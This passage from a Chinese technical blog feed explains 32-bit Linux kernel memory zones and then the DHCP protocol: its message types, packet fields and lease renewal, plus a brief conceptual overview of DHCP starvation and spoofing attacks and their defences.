alt="image.png"></p><blockquote><p>那为什么不全部采用动态内存分配，而是还要保留一大段线性映射区呢？</p><p>因为内核会频繁地进行虚拟、物理地址的转换，因此快速高效的线性映射方式就显得尤为重要，如果都按照页表去查找和替换，时间开销就很大，会严重影响内核运行速度，因此内核会将操作系统最频繁使用到的数据结构或代码放在线性映射区。</p><p>在Linux中，我们可以使用<code>sudo cat /proc/iomem</code>来查看物理内存布局情况。</p></blockquote><p>​同时，受限于硬件计算机体系结构的限制，比如在 X86 体系结构下，ISA 总线的 DMA 控制器只能对内存的前16MB 进行寻址，这就导致了 ISA 设备不能在整个 32 位地址空间中执行 DMA，所以线性映射区的前 16MB 被设置成专门让内核为 DMA 分配内存。因此，刚刚提到的前896MB线性映射区也被分成了两部分：低地址的 16MB 内存区域我们称之为 ZONE_DMA，接下来的880MB也就作为普通的线性映射区，即ZONE_NORMAL区域。</p><p>​接下来我们就依次来研究一下各个区域。</p><h2 id="一-ZONE-DMA（DMA区）"><a href="#一-ZONE-DMA（DMA区）" class="headerlink" title="一 . ZONE_DMA（DMA区）"></a>一 . ZONE_DMA（DMA区）</h2><p>​ZONE_DMA的范围是0~16MB，该区域的物理页面专门供I&#x2F;O设备的DMA使用，之所以需要单独管理DMA的物理页面，是因为DMA使用物理地址访问内存，不经过MMU，并且需要连续的缓冲区，所以为了能够提供物理上连续的缓冲区，必须从物理地址空间专门划分一段区域用于DMA。由于ISA只能寻址到内存前16MB的空间，因此直接将一整块16MB的物理内存作为DMA缓冲区，虚拟地址的ZONE_DMA同样连续，并且虚拟-物理一一对应，也使得DMA可以不经过MMU而进行快速高效地物理内存访问。</p><p>​虽然Linux这样设计，但在实际嵌入式领域，ZONE_DMA的大小，或者ZONE_DMA要不要存在，都取决于实际硬件设计。因为不同的平台为DMA预留的内存位置、大小有所差异，比如x86平台是线性映射区开始的16M，arm平台则由cpu厂商设置。假如某块嵌入式设备有三个DMA设备，其中两个都能访问整个4GB空间，而另一个只能访问512MB的空间，那完全可以将ZONE_DMA设置为512MB大小。</p><p>​此外，ZONE_DMA的作用是让寻址能力有限的DMA对应的外设驱动申请DMA buffer的时候从这个区域申请而已，但是它不是DMA专有的，理论上其他用途的内存依然可以申请这一块区域。值得注意的是，在现代计算机中，许多系统和设备已经支持更大范围内存区域的DMA访问，因此 ZONE_DMA区域在一些新的硬件上可能不再需要。而在一些旧的硬件或嵌入式系统中，仍然可能需要使用 ZONE_DMA区域。</p><h2 id="二-ZONE-NORMAL（普通区）"><a href="#二-ZONE-NORMAL（普通区）" class="headerlink" title="二 . ZONE_NORMAL（普通区）"></a>二 . ZONE_NORMAL（普通区）</h2><p>​在ZONE_NORMAL区存放着和内核相关的很多内容。由于ZONE_NORMAL和内核线性空间存在直接映射关系，读取效率高，内核会将频繁使用的数据如kernel代码（在磁盘&#x2F;boot目录下，并以ELF二进制文件格式存放的，在系统启动的时候会被加载进内存）、GDT、IDT、PGD、mem_map数组等放在ZONE_NORMAL里。而将用户数据、页表(PT)等不常用数据放在后面要介绍的高端内存ZONE_ HIGHMEM里，只在要访问这些数据时才建立映射关系(kmap())。</p><p>​内核代码包括进程管理，内存管理，文件系统操作等等一系列可执行代码，它们在启动时就会被加载到这块固定的内存区域，以便在系统运行时能随时访问到，通过<code>sudo cat /proc/iomem</code>查看，kernel text段大概占5MB大小。</p><table><thead><tr><th>内存类型</th><th>地址范围</th></tr></thead><tbody><tr><td>Kernel code</td><td>16M(<code>16777216</code>) - 约22.7M(<code>23829118</code>)</td></tr><tr><td>Kernel data</td><td>约22.7M(<code>23829119</code>) - 约27.2M(<code>28484095</code>)</td></tr><tr><td>Kernel bss</td><td>约28.9M(<code>30326784</code>) - 约31.9M(<code>33456127</code>)</td></tr></tbody></table><p>​此外，当我们使用 fork 系统调用创建进程的时候，内核会创建一系列进程相关的描述符，比如进程的核心数据结构 task_struct，进程的内存空间描述符 mm_struct，以及虚拟内存区域描述符 vm_area_struct 等，这些进程相关的数据结构也会存放在ZONE_NORMAL区域中以方便快速访问。</p><p>​还有内核栈。内核栈是系统为每个进程分配的内存区域，用于执行内核模式下的函数调用。它的大小通常在几KB到数十KB之间，用于存储函数的局部变量、寄存器状态和函数返回地址等。这确保了不同进程的内核操作互不干扰，这些栈同样在该ZONE_NORMAL区域。与进程用户空间中的栈不同的是，内核栈容量小而且是固定的，用户空间中的栈容量大而且可以动态扩展。内核栈的溢出危害非常巨大，它会直接悄无声息的覆盖相邻内存区域中的数据，破坏数据。</p><p>​ZONE_NORMAL区域还包括内核堆，通过kmalloc函数动态分配的内存会映射到该段区域里，由于kmalloc在线性映射区分配内存，因此能保证物理内存空间连续，并且分配及回收速度也比用户空间的malloc要快。</p><h2 id="三-ZONE-HIGHMEM（高端内存区）"><a href="#三-ZONE-HIGHMEM（高端内存区）" class="headerlink" title="三 . ZONE_HIGHMEM（高端内存区）"></a>三 . ZONE_HIGHMEM（高端内存区）</h2><p>​从内核空间的896MB - 1GB这128MB的内存不再采用线性映射的方式分配，而是采用动态内存分配机制，被统称为高端内存，它们能够映射到整个物理内存空间。由于应用目标的不同，高端内存又可以分为<strong>vmalloc区、可持久映射区和固定&#x2F;临时映射区</strong>。<img src="https://s2.loli.net/2023/09/11/KUiCDfrN3Wugxo8.png" alt="image.png"></p><p>​首先，high_memory指针指向高端内存的起点，也就是3GB+896MB的位置（3GB为低地址的用户空间，896MB为ZONE_NORMAL和ZONE_DMA区），接下来是有8MB的空洞（保留区，防止访问越界），再接下来，也就是3GB+896MB+8MB的位置，就是VMALLOC_START，即vmalloc区的起点。</p><h3 id="3-1-vmalloc区（Vmalloc-Area）"><a href="#3-1-vmalloc区（Vmalloc-Area）" class="headerlink" title="3.1 vmalloc区（Vmalloc Area）"></a>3.1 vmalloc区（Vmalloc Area）</h3><p>​从 VMALLOC_START 到 VMALLOC_END 之间的这块区域成为动态映射区，采用动态映射的方式映射物理内存中的高端内存。值得一提的是，这块内存占了整个高端内存的绝大部分空间，从high_memory到VMALLOC_END 大概有120MB的空间，在这之后的永久映射区和固定映射区只分别占用4MB，如下图所示。<img src="https://s2.loli.net/2023/09/11/KBt4wd6pfkYS8AD.png" alt="image.png"></p><p>​和用户态进程使用 malloc 申请内存一样，在这块动态映射区内核是使用 vmalloc系统调用进行内存分配的。vmalloc 分配的内存在虚拟内存上是连续的，但是物理内存不保证是连续的，它通过页表来建立物理内存与虚拟内存之间的映射关系，从而可以将不连续的物理内存映射到连续的虚拟内存上。</p><p>​也正因为它使用页表查找，在性能开销上会比直接映射大得多，因此一般申请大块内存（大型数据结构或设备驱动中的大型缓冲区等）会使用vmalloc，而频繁申请小块内存可以使用kmalloc分配到线性映射区。vmalloc函数原型是<code>void * vmalloc(unsigned long size);</code>，从作用原理来看，和用户态的malloc机制差不多，每申请一块vmalloc内存都会有一个vm_struct结构体来描述，所有结构体通过vmlist链表来组织到一起。更详细的解析可以参考 -&gt; <a href="https://zhuanlan.zhihu.com/p/346892153">linux内核vmalloc原理与实现</a>。</p><p>​kmalloc、vmalloc这两个函数所分配的内存都处于内核空间，但位置不同，kmalloc()分配的内存处于3GB～high_memory（ZONE_DMA、ZONE_NORMAL）之间即物理连续内存区；而vmalloc()分配的内存在VMALLOC_START～4GB（ZONE_HIGHMEM）之间，也就是非连续内存区。一般情况下在驱动程序中都是调用kmalloc()来给数据结构分配内存，而vmalloc()用在为活动的交换区分配数据结构，为某些I&#x2F;O驱动程序分配缓冲区，或为模块分配空间。以下是一些区别：</p><ul><li>kmalloc和vmalloc是分配的是内核的内存，malloc分配的是用户的内存；</li><li>kmalloc保证分配的内存在物理上是连续的，vmalloc保证的是在虚拟地址空间上的连续，malloc不保证任何；</li><li>kmalloc能分配的大小有限，vmalloc和malloc能分配的大小相对较大；</li><li>vmalloc和malloc比kmalloc要慢。</li></ul><h3 id="3-2-永久（持久）映射区（Persistent-Kernel-Mapping）"><a href="#3-2-永久（持久）映射区（Persistent-Kernel-Mapping）" class="headerlink" title="3.2 永久（持久）映射区（Persistent Kernel Mapping）"></a>3.2 永久（持久）映射区（Persistent Kernel Mapping）</h3><p>​vmalloc区往后，经过一块8KB的空隙，便来到了Persistent Kernel Mapping，它从 PKMAP_BASE 到 FIXADDR_START，只有4MB的大小 。在内核的这段虚拟地址空间中允许建立与物理高端内存的长期映射关系，这个空间和其它空间使用同样的页目录表，对于内核来说，就是 swapper_pg_dir，对普通进程来说，通过 CR3 寄存器指向。4M 的大小，仅仅需要一个页表即可，内核通过来 pkmap_page_table 寻找这个页表。</p><p>​比如内核通过 alloc_page() 申请了物理页框，需要为其分配线性的空间，即可通过 kmap() 在物理页框与内核虚拟页之间建立长期映射。Persistent Kernel Mapping通常只有4MB，最多能映射1024个页框，数量较为稀少，所以为了加强页框的周转，应及时调用kunmap() 将不再使用的物理页框释放。</p><h3 id="3-3-固定映射区（Fixing-Kernel-Mapping）"><a href="#3-3-固定映射区（Fixing-Kernel-Mapping）" class="headerlink" title="3.3 固定映射区（Fixing Kernel Mapping）"></a>3.3 固定映射区（Fixing Kernel Mapping）</h3><p>​固定映射区从FIXADDR_START开始到FIXADDR_TOP（0xFFFF F000，即4GB-4KB）处，一共只有不到4MB的大小，称为固定映射区域，主要用于满足特殊需求，这块空间具有如下特点：</p><ul><li>每个 CPU 占用一块空间。</li><li>在每个 CPU 占用的那块空间中，又分为多个小空间，每个小空间大小是 1 个 page，每个小空间用于一个目的，这些目的定义在 kmap_types.h 中的 km_type 中。</li></ul><p>​在前面的直接映射区中，虚拟内存地址与物理内存前 896M 的空间的映射关系都是预设好的，一比一映射，但在固定映射区中的虚拟内存地址可以自由映射到物理内存的高端地址上。而与动态映射区和永久映射区不同的是，在固定映射区中虚拟地址是固定的，而被映射的物理地址是可以改变的。也就是说，有些虚拟地址在编译的时候就固定下来了，是在内核启动过程中被确定的，而这些虚拟地址对应的物理地址不是固定的。采用固定虚拟地址的好处是它相当于一个指针常量（常量的值在编译时确定），指向物理地址，如果虚拟地址不固定，则相当于一个指针变量。</p><p>​那为什么会有固定映射这个概念呢 ?  比如：在内核的启动过程中，有些模块需要使用虚拟内存并映射到指定的物理地址上，而且这些模块也没有办法等待完整的内存管理模块初始化之后再进行地址映射。因此，内核固定分配了一些虚拟地址，这些地址有固定的用途，使用该地址的模块在初始化的时候，将这些固定分配的虚拟地址映射到指定的物理地址上去。</p><h3 id="3-4-临时映射区"><a href="#3-4-临时映射区" class="headerlink" title="3.4 临时映射区"></a>3.4 临时映射区</h3><p>​在内核虚拟内存空间中的最后一小块区域为临时映射区，可通过 kmap_atomic 实现临时内核映射。</p><p>​假设用户态的进程要映射一个文件到内存中，先要映射用户态进程空间的一段虚拟地址到物理内存，然后将文件内容写入这个物理内存供用户态进程访问。给用户态进程分配物理内存页可以通过 alloc_pages() 分配完毕后，按说将用户态进程虚拟地址和物理内存的映射关系放在用户态进程的页表中，就完事大吉了。这时，用户态进程可以通过用户态的虚拟地址，也即 0 至 3G 的部分，经过页表映射后访问物理内存，并不需要内核态的虚拟地址里面也划出一块来映射到这个物理内存页。但是如果要把文件内容写入物理内存，这件事情要内核来干了，这就只好通过 kmap_atomic 做一个临时映射，写入物理内存完毕后，再 kunmap_atomic 来解映射即可。</p><h2 id="物理内存布局"><a href="#物理内存布局" class="headerlink" title="物理内存布局"></a>物理内存布局</h2><p>​物理内存ZONE_DMA 内存在开始的16MB，而前4 KB是第一个页帧，一般会忽略，因为通常保留给BIOS使用。接下来的640 KB是一个空洞。该区域之后的640KB - 1MB的区域由系统保留，用于映射各种ROM（通常是系统BIOS和显卡ROM）。</p><p>​内核启动过程中，存在一个实模式保护模式的切换过程。在linux启动的最初阶段，内核刚刚被装入内存时，分页功能还未启用，此时是直接存取物理地址的（或者说线性地址就等于物理地址）。但初始化完成后，内核也需要有自己的虚拟地址空间（1个G大小），该虚拟地址空间的地址映射关系，会被作为模版拷贝到其他进程的内核地址空间中。</p><p>​临时内核页表只用来映射物理地址的前8M空间内容。目的是允许CPU在实模式（直接存取物理地址）和保护模式（根据虚拟地址映射）之间切换的过程中，都能对这前8M的地址进行访问。（假如内核使用的全部内存可以存放在8M的空间里，因为一个页表可以映射4M的地址，所以8M的空间需要两个页表，也就是需要两个页目录项。这两张页表我们称为临时内核页表pg0和pg1。（页表的作用，参见地址映射）关于这部分更详细的内容，可以参考一下Linux启动的过程，这里就不过多阐述了，下面这幅图详细地描述了整个用户空间及内核空间的布局，可以作为复习参考。</p><p>​以上就是32位系统内核空间布局的全部内容了，其实关于永久映射区和固定映射区的知识我也还理解地不够清晰，这部分相对复杂一些，需要更多的知识储备才能更好地理解这些内容，如果有时间的话，可以进一步区研究一下这块的内容。除此之外，64位系统由于虚拟地址空间范围高达2^64，即16384 PB（即16777216 TB），完全不缺少虚拟地址空间，所以空间分布也和32位系统有着很大差异，后续有机会可以详细写一下~<img src="https://s2.loli.net/2023/09/12/ZqcQJphXwY2bo8g.jpg" alt="7777777777.jpg"></p><h2 id="提问"><a href="#提问" class="headerlink" title="提问"></a>提问</h2><ol><li><p>内核空间代码应该都是很健壮的，普通程序员也无法访问到该地址，为什么要需要一些空洞来防止越界呢？</p><p>​这些空洞可用作针对任何内核故障的保护措施。如果访问越界地址（即无意地访问物理上不存在的内存区），则访问失败并生成一个异常，报告该错误。如果vmalloc区域紧接着直接映射，那么访问将成功而不会注意到错误。在稳定运行的情况下，肯定不需要这个额外的保护措施，但它对开发尚未成熟的新内核特性是有用的。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP协议解析</title>
      <link href="/2023/08/31/N02_dhcp/"/>
      <url>/2023/08/31/N02_dhcp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>​DHCP（Dynamic Host Configuration Protocol，动态主机配置协议），前身是BOOTP协议，是一个<strong>局域网的网络协议</strong>，<strong>运行在UDP之上，服务端在UDP 67号端口，客户端在UDP 68号端口监听</strong>。DHCP主要作用是集中的管理、分配IP地址，使client 动态获得IP地址、网关地址、DNS服务器地址等信息，并能够提升地址的使用率。简单来说，DHCP就是一个不需要账号密码登录的、自动给内网机器分配IP地址等信息的协议。</p></blockquote><h2 id="DHCP工作流程"><a href="#DHCP工作流程" class="headerlink" title="DHCP工作流程"></a>DHCP工作流程</h2><p>​公网IP是由国际互联网号码分配机构（The Internet Assigned Numbers Authority，简称IANA）负责全球管理，并下放到五个大洲的相应管理机构进行分配。而私有IP地址则由各个局域网自行分配组织，早期采用静态配置文件的方法进行地址分配，而这种方法通常不太灵活，因此DHCP应运而生，它能动态及自动化地为局域网内的设备分配和管理 IP 地址。</p><p>​DHCP 是一种 <strong>Client&#x2F;Server 模式</strong> 的网络协议，由 DHCP Client 向 DHCP Server 提出配置申请，Server 返回给 Client 分配的配置信息。这里的 Client 和 Server 是<strong>应用程序</strong>，可以运行在电脑、服务器、路由器等设备上，比如<strong>家用路由器就可以作为 DHCP Server 为连接它的的设备进行IP地址的分配</strong>。DHCP流程分为四步，大家都比较清楚，这里就不做过多详细的介绍了：<img src="https://s2.loli.net/2023/08/31/KfzN25wuUeOLcIH.png" alt="image.png"></p><p>​下面介绍一下DHCP的报文主要的八种类型，其中前四种也就对应上面提到的四步流程。</p><table><thead><tr><th>报文类型</th><th>解释</th><th align="center">说明</th></tr></thead><tbody><tr><td><strong>Discover（0x01）</strong></td><td><strong>客户端请求包</strong></td><td align="center">DHCP客户端在初次请求IP地址时并不知道DHCP服务器的位置，因此广播发送Discover报文。</td></tr><tr><td><strong>Offer（0x02）</strong></td><td><strong>服务器响应包</strong></td><td align="center">DHCP服务器收到Discover报文后，会在所配置的地址池中查找一个合适的IP地址，加上相应的租约期限和其他配置信息（如网关、DNS服务器等），构造一个Offer报文，发送给客户端。</td></tr><tr><td><strong>Request（0x03）</strong></td><td><strong>客户端选择包</strong></td><td align="center">若一个网段内有多个DHCP服务器则客户端可能收到很多Offer，但它只能选一个，通常会选收到的第一个Offer，并构造一个Request包以广播自己的选择，希望获得所分配的IP地址。</td></tr><tr><td><strong>ACK（0x05）</strong></td><td><strong>服务器确认包</strong></td><td align="center">DHCP服务器收到Request报文后，根据Request报文中携带的用户MAC来查找有没有相应的租约记录。如果有则发送ACK应答报文通知客户端可以使用分配的IP地址；否则向客户端发送NAK（0x06）报文。</td></tr><tr><td>NAK（0x06）</td><td>服务器拒绝包</td><td align="center">如果DHCP服务器收到Request报文后，没有发现有相应的租约记录或者由于某些原因无法正常分配IP地址，则向客户端发送NAK应答报文，通知用户无法分配合适的IP地址。</td></tr><tr><td>Decline（0x04）</td><td>客户端拒绝包</td><td align="center">当DHCP客户端收到DHCP服务器ACK报文后，也不是就直接使用该IP了，而是会进行局域网内的地址冲突检测。若发现服务器分配的地址冲突或者由于其他原因导致不能使用，则会向服务器发送Decline报文，通知服务器所分配的IP地址不可用，以期获得新的IP地址。</td></tr><tr><td>Release（0x07）</td><td>客户端释放包</td><td align="center">当DHCP客户端不再需要使用IP地址时（一般出现在客户端关机、下线等状况）会主动向DHCP服务器发送RELEASE报文，告知服务器可释放对应的IP地址。</td></tr><tr><td>Inform（0x08）</td><td>客户端通知包</td><td align="center">DHCP客户端如果需要从DHCP服务器端获取更为详细的配置信息，则向DHCP服务器发送Inform报文；DHCP服务器在收到该报文后，将根据租约进行查找到相应的配置信息后，向DHCP客户端发送ACK应答报文。目前基本上已不再使用。</td></tr></tbody></table><p>​有几点需要补充注意一下，</p><ol><li><strong>DHCP discover</strong> 的等待时间预设为1秒，也就是当客户机将第一个DHCP discover包送出去之后，在1秒之内没有得到回应的话，就会进行第二次DHCP discover广播。若一直未得到回应，客户机会将这一广播包重新发送四次（以2，4，8，16秒为间隔，加上1-1000毫秒之间随机长度的时间）。如果都没有得到DHCP Server的回应，则客户端会放弃请求并从169.254.0.0&#x2F;16这个自动保留的私有IP地址中选用一个IP地址，网络状态为“受限制或无连接”。【更多解释见文末补充1】</li><li>客户端在接收到<strong>DHCP ack</strong>广播后，会向网络发送三个针对此IP地址的<strong>Gratuitous ARP</strong>以执行冲突检测，查询网络上有没有其它机器使用该IP地址。如果发现该IP地址已经被使用，客户机会发出一个<strong>DHCP decline</strong>数据包给DHCP服务器，拒绝此IP地址租约，并重新发送<strong>DHCP discover</strong>信息。此时，在DHCP服务器管理控制台中，会显示此IP地址为BAD_ADDRESS。</li></ol><p>​当我们执行<code>ipconfig /release</code>命令时，Windows会发送一个Release包并释放自己的IP地址，此时电脑将无法连接互联网，而当我们试图打开一个网页或者执行<code>ipconfig /renew</code>时，可以清晰地看到上述提到的四步获取IP的流程。<img src="https://s2.loli.net/2023/08/29/Ybn4UXI32W8Ekqg.png" alt="image.png"></p><h3 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h3><p><img src="https://s2.loli.net/2023/08/31/jBEs9OPgLAVbTak.png" alt="image.png"></p><p>​DHCP是应用层的报文，在它之下还有传输层UDP报文，网络层IP报文，链路层MAC报文以及帧头尾及校验码，下面是DHCP报文的各个字段解释。</p><ul><li><strong>op（操作类型）：表示报文的格式。当值为 1 时，表示Client -&gt; Server的请求报文；当值为 2 时，表示Server -&gt; Client的响应报文。</strong></li><li><strong>htype</strong>（硬件类型）：不同的硬件类型取不同的值，最常见的以太网，值是 1 。</li><li><strong>hlen</strong>（硬件地址长度）：表示硬件地址长度，以太网的值是 6 ，也就是 MAC 地址的长度。</li><li><strong>hops</strong>（跳数）：DHCP 报文经过的 DHCP 中继的数量，在局域网里为0跳（数据包每经过一个router，加1）。</li><li><strong>xid（交互 ID ）：DHCP 客户端取的随机值，收到 DHCP 服务器的响应报文时，通过查看 xid 值是否相同，来判断报文是否是发送给自己的。</strong></li><li><strong>secs</strong>（客户端启动秒数）：DHCP客户端从获取到IP地址或者续约过程开始，到现在所消耗的时间。以秒为单位。在没有获得IP地址前该字段始终为0。</li><li><strong>flags</strong>（标志）：广播响应标志位，Client 向 Server发送的包里的记号。当值为 0 时，表示服务器可以单播形式回复响应报文；当值为 1 时，服务器以广播形式回复响应报文。</li><li><strong>ciaddr</strong>（客户端 IP 地址）：客户端的 IP 地址，可以是分配的地址，也可以是正在使用的地址，还可以是的 0.0.0.0 。0.0.0.0 是客户端初始状态没有地址的时候，仅用于临时通信，不是有效的地址。</li><li><strong>yiaddr</strong>（你的 IP 地址）：当服务器发送响应报文时，将分配给客户端的 IP 地址填入这个字段。</li><li><strong>siaddr</strong>（服务器 IP 地址）：用来标识服务器的 IP 地址。</li><li><strong>giaddr</strong>（中继设备 IP 地址）：表示 DHCP 中继的 IP 地址，服务器通过识别这个字段来判断出客户端的网段地址，从而选择合适的地址池，为客户端分配该网段的 IP 地址。</li><li><strong>chaddr</strong>（客户端硬件地址）：用来标识客户端的MAC地址，当客户端发送广播发现报文时，这个字段就是自己的硬件地址。</li><li><strong>sname</strong>（服务器名）：可选项，为DHCP客户端分配IP地址的DHCP服务器名称（DNS域名格式）。在Offer和ACK报文中显示发送报文的DHCP服务器名称，其他报文显示为0。</li><li><strong>file</strong>（引导文件名）：可选项，DHCP服务器为DHCP客户端指定的启动配置文件名称及路径信息。仅在DHCP Offer报文中显示，其他报文中显示为空。</li><li><strong>options</strong>（可选项）：可选项，DHCP 服务器提供网络参数，都是使用的这个字段。长度可变，格式为”字段号码+长度+数据”。内容有很多，例如：租期、子网掩码、默认网关地址、DNS 服务器地址等。完整的DHCP选项参考：<a href="http://www.iana.org/assignments/bootp-dhcp-parameters">BOOTP Vendor Extensions and DHCP Options</a> 或 <a href="https://mp.weixin.qq.com/s/Mhy--bRzAdGmX50K9adjpw">DHCP扩展选项大全</a>。前文我们提到的DHCP报文类型就是Option 53选项表示的。</li></ul><p>​通过抓包可以看到报文的具体信息，例如下面这是 DHCP offer包。<img src="https://s2.loli.net/2023/08/31/md4SqIT3hpK8Ovs.png" alt="image.png"></p><h3 id="重新登陆"><a href="#重新登陆" class="headerlink" title="重新登陆"></a>重新登陆</h3><p>​有同学会注意到，自己的电脑每次开机几乎都是相同的IP地址，而非总是随机获取。实际上，DHCP Server 为 DHCP Client 分配 IP 地址时，会采用如下的顺序选择IP地址，因此会在第二步找到我们电脑曾经使用过的IP进行分配：</p><ol><li><p>首先寻找DHCP Server 中<strong>静态绑定设置</strong>的 IP 地址；</p></li><li><p>其次寻找该DHCP Client <strong>曾经使用过</strong>的 IP 地址；</p></li><li><p>最后从<strong>地址池中选择</strong>可用 IP 地址。</p></li><li><p>如果地址池耗尽，则<strong>依次查询超过租期、发生冲突</strong>的 IP 地址，如果找到就分配给新设备。</p></li><li><p>如果上述操作均无法满足，则<strong>报错</strong>。</p></li></ol><p>​并且，当我们的的设备重新上线登录时，由于之前自己已经分配过IP地址，因此会直接发送 DHCP request包申请上次使用过的IP地址而不是重新发送 DHCP discover 包新申请。</p><h3 id="更新租约"><a href="#更新租约" class="headerlink" title="更新租约"></a>更新租约</h3><p>​DHCP Server 向DHCP Client 出租的IP地址一般都有一个租借期限（例如12小时），期满后DHCP Server 便会收回出租的IP地址。那为什么我们机器的IP地址似乎并没有被直接回收呢？那就需要DHCP Client 主动申请延长其IP租约操作了。</p><ol><li>Client 会在租期过去50%时，会向为其提供IP地址的DHCP Server 发送<strong>DHCP request</strong>包。如果Client 接收到该Server 回应的<strong>DHCP ack</strong>消息包，Client 就会补满续约时间（如果给的TCP&#x2F;IP等参数配置有变化，Client 还会顺便更新自己的配置）。如果Client 没有收到该Server 的回复，则Client 不做任何事情，当前租期还剩50%。</li><li>如果第一步未收到Server 的回应，则Client 将在租期过去87.5%的时候再次向为其提供IP地址的DHCP Server 联系。如果有回应则不瞒租约时间，否则依然不做任何事情。</li><li>如果第二步依然没回应，到租约的100%时候，Client 必须放弃该IP地址，并重新<strong>广播 DHCP Discover包</strong>申请新的IP地址。</li></ol><p>​DHCP服务器提供的IP租期可以自行调整。租期时间过长会导致地址资源长期被占用，租期过短会导致DHCP请求包过多，增加网络负担。因此还要结合当前使用场景来设置。一般来说，对DHCP客户端数量较大，且断开网络比较频繁的场所，如机场、商铺等，可把DHCP租期配置较短，这样IP地址能很快被回收。而对于办公室等场所则可将租期配置时间适当调长。</p><p>​DHCP 提供了两种地址分配机制，可以根据网络需求为不同的 Client 选择不同的分配策略。</p><ul><li><strong>动态分配机制</strong>：通过 DHCP 为 Client 分配一个有<strong>使用期限</strong>的 IP 地址。如果 Client 没有及时续约，到达使用期限后，这个地址会被及时回收。</li><li><strong>静态分配机制</strong>：通过 DHCP 为特定的 Client 分配<strong>固定</strong>的 IP 地址。固定 IP 地址可以<strong>永久使用</strong>， Client 通常是打印机、服务器等设备。</li></ul><p>​尽管动态分配IP在安全性，便捷性等方面都有很多优势，但是在某些网络环境下，例如网吧或者学校机房，为了管理监控方便，性能优势以及自动化运维等，通常有可能选择DHCP静态分配机制。</p><h2 id="DHCP攻击及防御技术"><a href="#DHCP攻击及防御技术" class="headerlink" title="DHCP攻击及防御技术"></a>DHCP攻击及防御技术</h2><p>​DHCP虽然提供了一种局域网里简捷、高效的主机配置机制，但也如ARP一样，协议设计建立在局域网内主机相互信任的前提下，而未充分考虑到安全因素，因此也有一些安全漏洞，使得DHCP服务器容易受到攻击。比如它面临两种潜在的攻击类型： (1)未经授权的DHCP服务器。(2)未经授权的DHCP客户端。</p><p>​DHCP的攻击类型有很多种，例如：</p><ul><li><strong>DHCP饿死&#x2F;泛洪攻击</strong>：攻击者伪造大量DHCP请求报文打向服务器。一方面导致DHCP服务器地址池中的地址耗尽，无法为合法的DHCP客户端分配IP地址；另一方面可能导致DHCP服务器消耗过多的系统资源，无法处理正常业务。</li><li><strong>仿冒DHCP Server攻击</strong>：攻击者将自己伪装成DHCP Server或通过木马感染其他机器，并在局域网中运行DHCP服务。当局域网内机器请求新的IP地址时，攻击者或木马会伪造DHCP数据包进行应答，导致DHCP客户端无法访问网络。</li><li><strong>伪造DHCP请求方向报文攻击</strong>：例如非法伪造DHCP release报文，可能欺骗服务器释放正常机器的IP地址，错误地终止其租约。非法伪造DHCP续约报文可能导致客户端无法按照自己的意愿及时释放IP地址租约，造成大量IP地址被长时间占用。</li></ul><p>​模拟攻击同样可以参考上一篇ARP攻击文章，例如可以使用Linux kali发行版的工具，也可以自己构造相关网络包进行模拟攻击。在防御措施上，各家路由器厂商以及网安公司都提出过各种解决方案，例如配置信任端口，Snooping报文限速等等，可参考：<a href="https://www.h3c.com/cn/Service/Document_Software/Document_Center/Home/Routers/00-Public/Learn_Technologies/White_Paper/DHCP-1946/">DHCP防攻击技术白皮书-6W100-新华三集团-H3C</a>。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ol><li>当DHCP服务器故障，超时或其他原因导致设备无法获取IP地址时，会进行自我分配169.254.0.0&#x2F;16网段的地址，并将网关被配置为0.0.0.0，该段地址又称<a href="https://zh.wikipedia.org/wiki/%E9%93%BE%E8%B7%AF%E6%9C%AC%E5%9C%B0%E5%9C%B0%E5%9D%80"><strong>链路本地地址</strong>（LLA，Link-local address） - 维基百科</a>。具体流程为：**(a.) <strong>当确定四次呼叫都无法获得DHCP服务器回应后，客户端会随机生成一个169.254.0.0&#x2F;16网段的IP（RFC3927中建议使用MAC来生成IP地址，这样可以使IP碰撞率尽可能降低）。</strong>(b.)** 广播发送Gratuitous ARP包，目的是检测局域网内是否有设备使用过该IP（Gratuitous ARP在我的上一篇ARP文章里提到过，不了解的可以去看看）。**(c.)** 若没有冲突，则确定使用该IP地址。并且，客户端会每五分钟呼叫一次DHCP以期望能与其建立通信。<strong>值得注意的是，LLA地址无法接入到互联网，仅仅可以局域网内互联通信。</strong></li><li>DHCP RFC参考：<ol><li><a href="https://www.rfc-editor.org/rfc/rfc2131">RFC 2131: Dynamic Host Configuration Protocol</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc2132">RFC 2132: DHCP Options and BOOTP Vendor Extensions</a></li><li><a href="https://www.rfc-editor.org/rfc/rfc8415">RFC 8415: Dynamic Host Configuration Protocol for IPv6 (DHCPv6)</a></li></ol></li><li>补充阅读：<a href="https://mp.weixin.qq.com/s/XwwvglCrbJT6OxNN4lNvLQ">Windows DHCP服务器远程代码执行漏洞分析及利用方法（CVE-2019-0725）</a></li><li>DHCP relay 中继代理：<a href="https://support.huawei.com/enterprise/zh/doc/EDOC1100198436/be771137">DHCP Relay工作原理 - CloudEngine 9800, 8800, 6800, 5800 V200R020C10 配置指南-IP业务 - 华为 (huawei.com)</a></li></ol><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Computer Networks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议及内网攻击实践</title>
      <link href="/2023/08/21/N01_arp/"/>
      <url>/2023/08/21/N01_arp/</url>
      
